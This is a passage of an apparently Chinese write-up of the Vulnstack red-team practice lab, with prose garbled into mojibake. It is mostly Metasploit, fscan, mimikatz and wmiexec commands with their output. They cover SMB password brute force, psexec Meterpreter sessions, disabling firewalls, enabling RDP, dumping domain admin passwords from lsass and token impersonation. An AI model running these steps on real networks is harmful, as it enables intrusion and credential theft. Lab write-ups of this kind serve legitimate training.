class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">80</span>  ...  OK\n&#x3C;!DOCTYPE html>\n&#x3C;html lang=<span class=\"hljs-string\">\"en-gb\"</span> <span class=\"hljs-built_in\">dir</span>=<span class=\"hljs-string\">\"ltr\"</span>>\n&#x3C;head>\n        &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0\"</span> />\n        &#x3C;meta charset=<span class=\"hljs-string\">\"utf-8\"</span> />\n        &#x3C;base href=<span class=\"hljs-string\">\"http://192.168.93.120/\"</span> />\n      .....\n</code></pre>\n</li>\n<li>\n<p>å†…ç½‘ä¸»æœºæ¢æµ‹</p>\n<ul>\n<li>\n<p>è¿›å…¥<code>Centos</code>å‘½ä»¤è¡Œï¼Œç„¶åä¸Šä¼ <code>fscan</code> æ¥æ‰«æå†…ç½‘</p>\n<p>ç„¶åå°†æ‰«æç»“æœå­˜æ”¾åˆ°<code>1.txt</code></p>\n<pre><code class=\"hljs language-python\">./fscan -h <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">24</span> > <span class=\"hljs-number\">1.</span>txt \n</code></pre>\n</li>\n<li>\n<p><code>ICMP</code>å­˜æ´»ä¸»æœº</p>\n<pre><code class=\"hljs language-python\">(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>  <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>   <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>   <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>   <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>  <span class=\"hljs-keyword\">is</span> alive\n</code></pre>\n</li>\n<li>\n<p>ç«¯å£æ‰«æ</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">3306</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">3306</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">1433</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">139</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">139</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">139</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">135</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">135</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">135</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">80</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">80</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">80</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">22</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">22</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">88</span> <span class=\"hljs-built_in\">open</span>\n</code></pre>\n</li>\n<li>\n<p>ä¸»æœºç³»ç»Ÿ</p>\n<pre><code class=\"hljs language-python\">[*] NetInfo \n[*]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n   [->]WIN-8GA56TNV3MV\n   [->]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n[*] NetInfo \n[*]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\n   [->]win7\n   [->]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\n[*] NetInfo \n[*]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\n   [->]win2008\n   [->]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\n[*] OsInfo <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\t(Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span>)\n[*] OsInfo <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\t(Windows Server <span class=\"hljs-number\">2012</span> R2 Datacenter <span class=\"hljs-number\">9600</span>)\n[*] OsInfo <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\t(Windows Server (R) <span class=\"hljs-number\">2008</span> Datacenter <span class=\"hljs-number\">6003</span> Service Pack <span class=\"hljs-number\">2</span>)\n[*] NetBios <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>   win2008.test.org                    Windows Server (R) <span class=\"hljs-number\">2008</span> Datacenter <span class=\"hljs-number\">6003</span> Service Pack <span class=\"hljs-number\">2</span>\n[*] NetBios <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server <span class=\"hljs-number\">2012</span> R2 Datacenter <span class=\"hljs-number\">9600</span>\n[+] mysql <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">3306</span>:root <span class=\"hljs-number\">123</span>\n[+] mysql <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">3306</span>:root <span class=\"hljs-number\">123</span>\n</code></pre>\n<p>ä¸€å°<code>WIN7</code>ï¼Œä¸€å°<code>server2008</code> ï¼Œä»¥åŠ<code>server2012</code>å¹¶ä¸”éƒ½æ‰“å¼€äº†<code>445</code>ç«¯å£</p>\n</li>\n</ul>\n</li>\n<li>\n<p>æ€»ç»“å½“å‰ä¿¡æ¯</p>\n<p>å½“å‰æ‹¿ä¸‹äº†<code>Centos</code>ä¸»æœº<code>root</code>æƒé™ï¼Œä»¥åŠå‘ç° åŸŸå†…ä¸»æœº<code>win2008</code>å’Œ<code>win7</code> ä»¥åŠåŸŸæ§<code>WIN-8GA56TNV3MV</code> ï¼Œå¹¶ä¸”éƒ½å¼€æ”¾äº†<code>445</code>ç«¯å£</p>\n</li>\n</ol>\n<h2>SMB å£ä»¤çˆ†ç ´</h2>\n<ol>\n<li>\n<p>ä½¿ç”¨MSFçš„<code>smb_login</code>æ¨¡å—è¿›è¡Œçˆ†ç ´ï¼Œå°è¯•çˆ†ç ´<code>win2008</code>çš„</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_version) > use uxiliary/scanner/smb/smb_login\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> threads <span class=\"hljs-number\">5</span>\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> SMBuser administrator\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> pass_file /root/Desktop/<span class=\"hljs-type\">Dict</span>/Blasting_dictionary-master/top10W.txt\nmsf6 auxiliary(scanner/smb/smb_login) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Starting SMB login bruteforce\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Success: <span class=\"hljs-string\">'.\\administrator:123qwe!ASD'</span> Administrator\n[!] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - No active DB -- Credential data will <span class=\"hljs-keyword\">not</span> be saved!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - Bruteforce completed, <span class=\"hljs-number\">1</span> credential was successful.\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - You can <span class=\"hljs-built_in\">open</span> an SMB session <span class=\"hljs-keyword\">with</span> these credentials <span class=\"hljs-keyword\">and</span> CreateSession <span class=\"hljs-built_in\">set</span> to true\n</code></pre>\n<p>æ²¡æƒ³åˆ°æˆåŠŸäº†ï¼Œçš„åˆ°å¯†ç <code>123qwe!ASD</code> ï¼ˆè¿™ä¸ªå¯†ç æ˜¯æˆ‘è‡ªå·±åŠ ä¸Šå»çš„ï¼Œå› ä¸ºæˆ‘çš„å­—å…¸çˆ†ç ´ä¸å‡ºæ¥ï¼Œç½‘ä¸Šçš„writeupå¾ˆå¤šå¸ˆå‚…éƒ½å¯ä»¥çˆ†ç ´ï¼Œæˆ‘å°±åŠ ä¸Šäº†ï¼‰</p>\n</li>\n<li>\n<p>å†ä½¿ç”¨è¯¥å¯†ç æµ‹è¯•åŸŸå†…å…¶ä»–æœºå™¨</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\nmsf6 auxiliary(scanner/smb/smb_login) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span> - Starting SMB login bruteforce\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span> - Success: <span class=\"hljs-string\">'.\\administrator:123qwe!ASD'</span> Administrator\n[!] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - No active DB -- Credential data will <span class=\"hljs-keyword\">not</span> be saved!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - Bruteforce completed, <span class=\"hljs-number\">1</span> credential was successful.\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - You can <span class=\"hljs-built_in\">open</span> an SMB session <span class=\"hljs-keyword\">with</span> these credentials <span class=\"hljs-keyword\">and</span> CreateSession <span class=\"hljs-built_in\">set</span> to true\n[*] Auxiliary module execution completed\n</code></pre>\n<p>æœ€åå‘ç°<code>win2008</code>å’Œ<code>win7</code>éƒ½æ˜¯åŒä¸€å¯†ç </p>\n</li>\n</ol>\n<h2>ä½¿ç”¨psexecè¿æ¥ &#x26; æŠ“å–å¯†ç </h2>\n<ol>\n<li>\n<p>ä½¿ç”¨MSFé‡Œè¾¹çš„æ¨¡å— è¿æ¥<code>192.168.93.20</code></p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                         \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>                                 \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBpass 123qwe!ASD                                   \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/bind_tcp                 \nmsf6 exploit(windows/smb/psexec) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Connecting to the server...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Authenticating to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-keyword\">as</span> user <span class=\"hljs-string\">'administrator'</span>...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Selecting PowerShell target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Executing the payload...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">4444</span>\n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\n[*] Meterpreter session <span class=\"hljs-number\">3</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">42597</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">4444</span> via session <span class=\"hljs-number\">2</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">45</span> +0800                                                                                                                          \n</code></pre>\n</li>\n<li>\n<p>æŸ¥çœ‹æƒé™</p>\n<pre><code class=\"hljs language-python\">meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n</li>\n<li>\n<p>å…³é—­é˜²ç«å¢™ä»¥åŠå¼€å¯è¿œç¨‹æ¡Œé¢</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># å…³é—­é˜²ç«å¢™</span>\nC:\\Windows\\system32>netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\nnetsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n<span class=\"hljs-comment\"># æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£</span>\nC:\\Windows\\system32>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\nThe operation completed successfully.\n</code></pre>\n</li>\n<li>\n<p>æµ‹è¯•è¿æ¥è¿œç¨‹æ¡Œé¢ï¼ˆè®°å¾—<code>!</code>å‰è¦åŠ æ–œæ æ¥è½¬ä¹‰ï¼‰</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image47.png\" alt=\"image.png\"></p>\n<p>è¿æ¥æˆåŠŸ</p>\n</li>\n<li>\n<p><code>MSF</code>åŠ è½½<code>mimikatz</code>æ¥æŠ“å–å¯†ç </p>\n<pre><code class=\"hljs language-python\">C:\\Windows\\system32>exit\nexit\nmeterpreter > load kiwi\nLoading extension kiwi...\n  .<span class=\"hljs-comment\">#####.   mimikatz 2.2.0 20191125 (x86/windows)</span>\n .<span class=\"hljs-comment\">## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)</span>\n <span class=\"hljs-comment\">## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>\n <span class=\"hljs-comment\">## \\ / ##       > http://blog.gentilkiwi.com/mimikatz</span>\n <span class=\"hljs-string\">'## v ##'</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  <span class=\"hljs-string\">'#####'</span>         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\n[!] Loaded x86 Kiwi on an x64 architecture.\n\nSuccess.\n</code></pre>\n<ul>\n<li>\n<p><code>mimikatz</code> éœ€è¦åœ¨<code>x64</code>ä¸‹è¿è¡Œï¼Œæˆ‘ä»¬psæ‰“å°æ­£åœ¨è¿è¡Œç¨‹åº</p>\n<pre><code class=\"hljs language-python\">meterpreter > ps\n            \nProcess <span class=\"hljs-type\">List</span>\n============  \n\n PID   PPID  Name                          Arch  Session  User                          Path \n ---   ----  ----                          ----  -------  ----                          ----   \n <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>     [System Process]   \n <span class=\"hljs-number\">4</span>     <span class=\"hljs-number\">0</span>     System                        x64   <span class=\"hljs-number\">0</span> \n <span class=\"hljs-number\">300</span>   <span class=\"hljs-number\">616</span>   svchost.exe                   x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n <span class=\"hljs-number\">320</span>   <span class=\"hljs-number\">616</span>   SLsvc.exe                     x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\SLsvc.exe\n <span class=\"hljs-number\">408</span>   <span class=\"hljs-number\">4</span>     smss.exe                      x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\smss.exe\n <span class=\"hljs-number\">628</span>   <span class=\"hljs-number\">536</span>   lsass.exe                     x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\lsass.exe \n</code></pre>\n<p>è¿ç§»åˆ°<code>lsass.exe</code></p>\n<pre><code class=\"hljs language-python\">meterpreter > migrate <span class=\"hljs-number\">628</span>\n[*] Migrating <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">2720</span> to <span class=\"hljs-number\">628.</span>..\n[*] Migration completed successfully.\n</code></pre>\n</li>\n<li>\n<p>æŠ“å–å¯†ç </p>\n<pre><code class=\"hljs language-python\">meterpreter > creds_all                        \nkerberos credentials                          \n====================                                                                                                                                                                    \n                                              \nUsername       Domain    Password    \n--------       ------    --------             \n(null)         (null)    (null)\nAdministrator  TEST.ORG  zxcASDqw123!!                                                      \nAdministrator  WIN2008   123qwe!ASD\n</code></pre>\n<p>æŠ“å–åˆ°åŸŸçš„ç®¡ç†å‘˜è´¦æˆ·å¯†ç ï¼Œå¯†ç ä¸º <code>zxcASDqw123!!</code></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>è·å–åŸŸæ§shell</h2>\n<ol>\n<li>\n<p>ä¸Šè¾¹æŠ“åˆ°äº†åŸŸç®¡ç†å‘˜çš„å¯†ç ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>psexec</code>è¿æ¥</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                                                     \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBPass zxcASDqw123!!\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">4445</span>\nmsf6 exploit(windows/smb/psexec) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Connecting to the server...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Authenticating to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-keyword\">as</span> user <span class=\"hljs-string\">'administrator'</span>...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Selecting PowerShell target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Executing the payload...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">4445</span>\n[*] Exploit completed, but no session was created.\nmsf6 exploit(windows/smb/psexec) > \n</code></pre>\n<p>æ²¡è¿ä¸Šï¼ŒæŒ å¤´</p>\n</li>\n<li>\n<p>æ¢åˆ«çš„å·¥å…·ï¼Œæ–°æ‰¾åˆ°çš„ä¸€ä¸ªå·¥å…·ï¼Œå‘ç°æŒºå¥½ç”¨çš„</p>\n<blockquote>\n<p><a href=\"https://github.com/XiaoliChan/wmiexec-Pro\">https://github.com/XiaoliChan/wmiexec-Pro</a></p>\n</blockquote>\n<ul>\n<li>\n<p>æµ‹è¯•æ˜¯å¦æˆåŠŸï¼ˆå¯†ç çš„<code>!</code>å·å‰é¢è®°å¾—åŠ ä¸Šæ–œæ è½¬ä¹‰ï¼‰</p>\n<pre><code class=\"hljs language-python\">proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> <span class=\"hljs-built_in\">exec</span>-command -command <span class=\"hljs-string\">\"ipconfig\"</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">[+] Getting command results...\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::1fa:2f8:97ac:<span class=\"hljs-number\">1160</span>%<span class=\"hljs-number\">12</span>\n   IPv4 Address. . . . . . . . . . . : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n   Subnet Mask . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\n   Default Gateway . . . . . . . . . : \n\nTunnel adapter isatap.{22AC77BB-<span class=\"hljs-number\">4205</span>-<span class=\"hljs-number\">4120</span>-89CB-C8F5240403E0}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n</code></pre>\n<p>æˆåŠŸè·å–åˆ°åŸŸæ§IP</p>\n</li>\n<li>\n<p>æˆ‘ä»¬å°†å…¶é˜²ç«å¢™å…³é—­</p>\n<pre><code class=\"hljs language-python\">proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> firewall -firewall-profile disable\n[+] All firewall profile has been disable.\n</code></pre>\n</li>\n<li>\n<p>å¼€å¯3389ç«¯å£ï¼ˆRDPï¼‰æœåŠ¡</p>\n<pre><code class=\"hljs language-python\">proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> rdp -enable\n[+] Enabling RDP services <span class=\"hljs-keyword\">and</span> setting up firewall.\n[+] RDP port: <span class=\"hljs-number\">3389</span>\n[+] RDP enabled!\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>çªƒå–ç®¡ç†å‘˜<code>token</code>ä»¤ç‰Œ</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># meterpreter > use incognito</span>\n\n<span class=\"hljs-comment\"># meterpreter > list_tokens -u  </span>\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nTEST\\administrator\nWIN2008\\Administrator\n\n<span class=\"hljs-comment\"># meterpreter > impersonate_token \"TEST\\administrator\"</span>\n[+] Delegation token available\n[+] Successfully impersonated user TEST\\administrator\n</code></pre>\n</li>\n<li>\n<p>å°è¯•è¿æ¥è¿œç¨‹æ¡Œé¢</p>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> -p zxcASDqw123\\!\\! -u administrator -v     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\nis_wm_active(): WM name: Xfwm\nConnecting to server using NLA...\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span 